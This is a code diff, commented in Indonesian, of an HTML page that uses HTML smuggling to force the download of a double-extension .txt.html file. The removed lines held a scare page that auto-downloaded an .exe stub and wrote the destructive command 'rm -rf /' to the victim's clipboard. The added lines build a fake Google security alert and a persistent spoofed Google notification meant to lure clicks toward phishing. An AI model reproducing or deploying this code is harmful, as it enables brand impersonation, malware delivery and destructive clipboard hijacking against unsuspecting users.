@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: HTML Smuggling + Notification & Clipboard API</title>
+<title>Chaining: Alert -> Fake Google Notification</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -20,8 +20,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Chaining: HTML Smuggling + Native API Abuse</h2>
-<p>Mengunduh file .txt.html yang saat dibuka akan memicu unduhan file .exe dan menyalahgunakan Notification & Clipboard API.</p>
+<h2>Chaining: Fake Google Notification</h2>
+<p>Mengunduh file .txt.html yang saat dibuka akan memunculkan alert, lalu memaksa notifikasi sistem palsu (Google).</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -48,101 +48,74 @@ const prepareMimeBlobAsync = (i) => {
         queueMicrotask(() => {
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>System Alert</title></head>" +
-            "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
-            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-            "<h1 style='font-size:60px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>SYSTEM ALERT</h1>" +
-            "<h2 style='font-size:28px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
-            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
-            "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
-            "<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
-            "<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
+            "<head><meta charset='UTF-8'><title>Security Alert</title></head>" +
+            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
+            "    <h2 style='color:#ff4444;margin-bottom:10px;'>⚠️ Security Alert</h2>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Kami mendeteksi adanya aktivitas mencurigakan pada akun Google Anda. Klik OK pada notifikasi untuk mengamankan akun.</p>" +
+            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menunggu konfirmasi...</p>" +
             "</div>" +
-            "<style>" +
-            "@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
-            "body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
-            "</style>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
-            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-
-            "function b64KeBytes(b64){" +
-            "    var binary = atob(b64);" +
-            "    var len = binary.length;" +
-            "    var bytes = new Uint8Array(len);" +
-            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
-            "    return bytes;" +
-            "}" +
             
-            "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" + // Payload EXE
             "var sudah = false;" +
-
-            // --- CHAINING DENGAN NOTIFICATION API ---
-            "function abuseNotification() {" +
-            "    if (!('Notification' in window)) return;" +
+            
+            "function picuNotifikasi(){" +
+            "    if (sudah) return;" +
+            "    sudah = true;" +
+            "    var statusEl = document.getElementById('status');" +
+            
+            // 1. Munculkan Alert (sebagai pemicu User Gesture)
+            "    try { alert('Peringatan Keamanan Google: Akun Anda terindikasi diretas. Klik OK untuk memeriksa.'); } catch(e){}" +
+            
+            // 2. Setelah OK diklik, eksekusi Notification API
+            "    if (!('Notification' in window)) {" +
+            "        statusEl.textContent = 'Browser tidak mendukung notifikasi.';" +
+            "        return;" +
+            "    }" +
+            
             "    if (Notification.permission === 'granted') {" +
-            "        new Notification('System Compromised', {" +
-            "            body: 'Klik di sini untuk memperbaiki sistem Anda.'," +
-            "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'" +
-            "        });" +
+            "        tampilkanNotif();" +
             "    } else if (Notification.permission !== 'denied') {" +
             "        Notification.requestPermission().then(function(permission) {" +
             "            if (permission === 'granted') {" +
-            "                new Notification('System Compromised', {" +
-            "                    body: 'Klik di sini untuk memperbaiki sistem Anda.'" +
-            "                });" +
+            "                tampilkanNotif();" +
+            "            } else {" +
+            "                statusEl.textContent = 'Izin notifikasi ditolak.';" +
             "            }" +
             "        });" +
             "    }" +
             "}" +
-
-            // --- CHAINING DENGAN CLIPBOARD API ---
-            "function abuseClipboard() {" +
-            "    // Menimpa isi clipboard korban dengan perintah berbahaya (jika diizinkan)" +
-            "    if (navigator.clipboard && navigator.clipboard.writeText) {" +
-            "        navigator.clipboard.writeText('rm -rf /').catch(function(e) {" +
-            "            console.log('Clipboard diblokir:', e.message);" +
-            "        });" +
-            "    }" +
-            "}" +
-
-            "function picuDownload(){" +
-            "    if (sudah) return;" +
-            "    sudah = true;" +
-            "    var statusEl = document.getElementById('status');" +
-            "    try{" +
-            "        statusEl.textContent = 'Menyiapkan berkas...';" +
             
-            // Eksekusi API lain secara paralel
-            "        abuseNotification();" +
-            "        abuseClipboard();" +
-
-            "        var bytesArr = b64KeBytes(b64Data);" +
-            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
-            "        var url = URL.createObjectURL(blob);" +
-            "        var a = document.createElement('a');" +
-            "        a.href = url;" +
-            "        a.download = 'hacked-by-anonymous.exe';" +
-            "        a.style.display = 'none';" +
-            "        document.body.appendChild(a);" +
-            "        a.click();" +
-            "        setTimeout(function(){ " +
-            "            if (a.parentNode) a.parentNode.removeChild(a); " +
-            "            URL.revokeObjectURL(url); " +
-            "        }, 3000);" +
-            "        statusEl.textContent = 'Payload berhasil diunduh & API dieksekusi!';" +
+            "function tampilkanNotif(){" +
+            "    var statusEl = document.getElementById('status');" +
+            "    try {" +
+            // Memalsukan Notifikasi Google (Ikon & Judul)
+            "        var notif = new Notification('Google Security Alert', {" +
+            "            body: 'Sesi login tidak dikenal terdeteksi. Klik untuk mengamankan akun Anda.'," +
+            "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
+            "            badge: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
+            "            tag: 'google-security'," +
+            "            requireInteraction: true" + // Notifikasi tidak hilang sampai diklik
+            "        });" +
+            
+            // Aksi saat notifikasi diklik
+            "        notif.onclick = function() {" +
+            "            window.focus();" +
+            // Arahkan ke halaman phishing atau picu unduhan
+            "            window.location.href = 'https://accounts.google.com'; " + 
+            "        };" +
+            "        statusEl.textContent = 'Notifikasi Google palsu berhasil ditampilkan!' ;" +
             "        statusEl.style.color = '#0f0';" +
-            "    } catch(e){" +
-            "        statusEl.textContent = 'Gagal: ' + e.message;" +
-            "        statusEl.style.color = '#f00';" +
-            "        sudah = false;" +
+            "    } catch(e) {" +
+            "        statusEl.textContent = 'Gagal menampilkan notifikasi: ' + e.message;" +
             "    }" +
             "}" +
-
-            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-            "document.addEventListener('click', picuDownload);" +
-            "document.addEventListener('touchstart', picuDownload);" +
+            
+            // TRIGGER: Klik di mana saja memicu alert & notifikasi
+            "document.addEventListener('click', picuNotifikasi);" +
+            "document.addEventListener('touchstart', picuNotifikasi);" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -158,8 +131,8 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `waguri-alert-${fileData.id}.txt.html`; // Ekstensi ganda
-    link.textContent = `Blob #${fileData.id} (.txt.html)`;
+    link.download = `google-security-${fileData.id}.txt.html`; // Ekstensi ganda
+    link.textContent = `Download google-security.txt.html`;
     link.style.display = "none";
     document.body.appendChild(link);
     link.click();
@@ -170,9 +143,9 @@ startBtn.addEventListener("click", () => {
     if (isProcessing) return;
     isProcessing = true;
     startBtn.disabled = true;
-    statusDiv.textContent = "Menyiapkan file Chaining...";
+    statusDiv.textContent = "Menyiapkan file Fake Notification...";
 
-    speak("Menyiapkan file dengan Native API Abuse.");
+    speak("Menyiapkan file notifikasi palsu.");
 
     const root = document.documentElement;
     try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
@@ -182,7 +155,7 @@ startBtn.addEventListener("click", () => {
             const fileData = await prepareMimeBlobAsync(1);
             activeUrls.push(fileData.url);
             triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh.";
+            statusDiv.textContent = "File berhasil diunduh. Buka file dan klik layar.";
         } catch(e) {
             statusDiv.textContent = "Gagal: " + e.message;
         }
